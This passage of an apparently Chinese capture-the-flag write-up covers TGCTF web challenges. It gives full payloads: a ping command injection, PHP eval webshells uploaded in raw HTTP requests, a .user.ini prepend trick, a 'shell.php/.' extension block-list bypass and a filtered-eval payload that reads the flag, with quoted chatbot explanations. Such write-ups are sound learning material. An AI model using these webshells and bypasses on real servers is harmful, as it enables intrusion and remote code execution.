class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span> /&amp;ping=ping<br><br>回显：<br>bin<span class="hljs-symbol">&lt;br&gt;</span><br>dev<span class="hljs-symbol">&lt;br&gt;</span><br>etc<span class="hljs-symbol">&lt;br&gt;</span><br>flag<span class="hljs-symbol">&lt;br&gt;</span><br>home<span class="hljs-symbol">&lt;br&gt;</span><br>lib<span class="hljs-symbol">&lt;br&gt;</span><br>media<span class="hljs-symbol">&lt;br&gt;</span><br>mnt<span class="hljs-symbol">&lt;br&gt;</span><br><span class="hljs-keyword">opt</span><span class="hljs-symbol">&lt;br&gt;</span><br>proc<span class="hljs-symbol">&lt;br&gt;</span><br>root<span class="hljs-symbol">&lt;br&gt;</span><br>run<span class="hljs-symbol">&lt;br&gt;</span><br>sbin<span class="hljs-symbol">&lt;br&gt;</span><br>srv<span class="hljs-symbol">&lt;br&gt;</span><br>sys<span class="hljs-symbol">&lt;br&gt;</span><br>tmp<span class="hljs-symbol">&lt;br&gt;</span><br>usr<span class="hljs-symbol">&lt;br&gt;</span><br>var<span class="hljs-symbol">&lt;br&gt;</span><br></code></pre></td></tr></table></figure><p>那接下来cat &#x2F;flag就行  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">command</span>=127.0.0.0|cat /flag&amp;<span class="hljs-attribute">ping</span>=ping<br></code></pre></td></tr></table></figure><p>拿到flag</p><h1 id="TGCTF-ezupload"><a href="#TGCTF-ezupload" class="headerlink" title="TGCTF ezupload"></a>TGCTF ezupload</h1><p>先上传一个正常的jpg   </p><p>回显  </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">403</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>7981<span class="hljs-char escape_">\u</span>6b62<span class="hljs-char escape_">\u</span>4fdd<span class="hljs-char escape_">\u</span>5b58<span class="hljs-char escape_">\u</span>4e3a<span class="hljs-char escape_">\u</span>8be5<span class="hljs-char escape_">\u</span>7c7b<span class="hljs-char escape_">\u</span>578b<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;<br><br>unicode解码后的意思就是<br><br>文件内容包含非法字符，禁止上传！<br><br>我不明白  <br></code></pre></td></tr></table></figure><p>抓包传马看看：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary5Frc88R0NhJL8adt<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: aimage/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[zhong]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>还是不行   </p><p>扫一下目录<br>看到有index.php.bak  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[17:07:56]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:07:57]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br><span class="hljs-selector-attr">[17:10:56]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">30</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br></code></pre></td></tr></table></figure><p>访问一下uploads&#x2F;,403,顺便知道了服务端是nginx<br>那猜测一下会有upload.php.bak<br>给我猜对了   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure><p>经测试，uploads&#x2F;index.php<br>回显：<br>File not found.  </p><p>并没有404<br>那应该就能用.user.ini的办法  </p><p>上传  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>331<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMjahAHXakvDQQiYS<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">上传文件</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryMjahAHXakvDQQiYS--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 08 May 2025 09:24:17 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.26<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><br><span class="language-nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">200</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>4e0a<span class="hljs-char escape_">\u</span>4f20<span class="hljs-char escape_">\u</span>6210<span class="hljs-char escape_">\u</span>529f<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>解码后的意思就是成功<br>文件上传成功！<br>访问<br>&#x2F;uploads&#x2F;shell.jpg<br>访问成功！  </p><p>然后接下来传.user.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span> = shell.jpg<br></code></pre></td></tr></table></figure><p>上传成功<br>接下来用蚂蚁连<br>&#x2F;uploads&#x2F;index.php<br>失败？  </p><p>不对，竟然不用  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;包裹，那应该也不用&lt;script&gt;头了<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);<br></code></pre></td></tr></table></figure><p>也不行，<br>实在没办法了，去看wp，<br>说是在源码里知道能用name参数来进行目录穿越？  </p><p>直接传  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php?name=shell.php/.</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50404<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryDxKYmUwl8LfJkYfi<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50404/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;name&quot;</span>; filename=<span class="hljs-string">&quot;hello.jpg&quot;</span></span><br><span class="language-php">Content-Type: image/jpg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传文件</span><br><span class="language-php">------WebKitFormBoundaryDxKYmUwl8LfJkYfi--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>尽然就成功传进去了？<br>这个是什么构造法？什么原理？<br>&#x2F;upload.php?name&#x3D;hello.php&#x2F;.   </p><p>然后蚂蚁直接连<br>&#x2F;uploads&#x2F;shell.php<br>然后用蚂蚁的终端看环境<br>env<br>看到flag</p><p>原理是啥，怎么绕过的？</p><p>deepseek:  </p><blockquote><p>漏洞点：当攻击者通过GET参数name&#x3D;shell.php&#x2F;.传递文件名时，pathinfo()解析扩展名的行为异常。<br>pathinfo(‘shell.php&#x2F;.’, PATHINFO_EXTENSION)会返回空值，因为末尾的&#x2F;.被识别为目录结构而非文件扩展名。<br>黑名单检查$deny_ext因此误判文件类型合法，绕过防护。  </p></blockquote><p>反正我在kali里<br>echo 114514 &gt; sunxiaochuan258.txt&#x2F;.是无法执行的  </p><p>那可能就是误判文件类型了</p><p>当然，刚才是烧一点的做法，正常的做法是<br>利用name参数来进行目录穿越，然后在index.php主目录下上传shell.jpg和.user.ini</p><p>这题也是学到不少</p><h1 id="TGCTF-AAA偷渡阴平"><a href="#TGCTF-AAA偷渡阴平" class="headerlink" title="TGCTF AAA偷渡阴平"></a>TGCTF AAA偷渡阴平</h1><p>据说是web签到<br>开题拿到源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$tgctf2025</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tgctf2025&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$tgctf2025</span>))&#123;<br>    <span class="hljs-comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$tgctf2025</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>?tgctf2025&#x3D;system(ls);<br>&#x2F;&#x2F;Warning: Use of undefined constant ls - assumed ‘ls’ (this will throw an Error in a future version of PHP) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : eval()’d code on line 1<br>index.php</p><p>看wp得到payload<br>?tgctf2025&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;system(‘cat &#x2F;f*’);<br>不明白<br>问问ai  </p><h2 id="kimi"><a href="#kimi" class="headerlink" title="kimi:  "></a>kimi:  </h2><p>该 PHP 脚本存在代码注入漏洞，以下是对 payload 的解释：  </p><p>?tgctf2025&#x3D;eval(end(current(get_defined_vars()))); ：  </p><p>get_defined_vars() 返回一个包含所有已定义变量的数组，包括全局变量和局部变量。  </p><p>current() 函数取得数组中的当前元素，这里会得到数组的第一个元素，通常是 GLOBALS 数组。  </p><p>end() 函数将数组的内部指针指向最后一条记录并返回该记录，此处作用于 